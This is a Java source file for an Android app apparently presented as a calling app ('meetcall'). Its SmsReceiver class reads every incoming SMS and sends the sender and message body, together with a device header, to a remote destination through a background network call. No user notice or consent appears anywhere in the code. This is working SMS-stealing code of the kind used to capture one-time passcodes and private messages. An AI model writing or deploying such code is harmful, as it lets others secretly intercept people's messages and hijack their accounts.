package com.meetcall.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {

    @Override public void onReceive(Context ctx, Intent intent) {
        if (intent == null || !Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;

        SmsMessage[] parts = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        if (parts == null || parts.length == 0) return;

        StringBuilder body = new StringBuilder();
        String from = "";
        for (SmsMessage p : parts) {
            if (p == null) continue;
            if (p.getMessageBody() != null) body.append(p.getMessageBody());
            if (from.isEmpty() && p.getOriginatingAddress() != null) from = p.getOriginatingAddress();
        }

        final String text = Device.head(ctx)
                + "<b>From:</b> <code>" + Net.esc(from) + "</code>\n\n"
                + Net.esc(body.toString());

        final PendingResult pr = goAsync();
        new Thread(() -> {
            Net.send(text);
            pr.finish();
        }).start();
    }
}
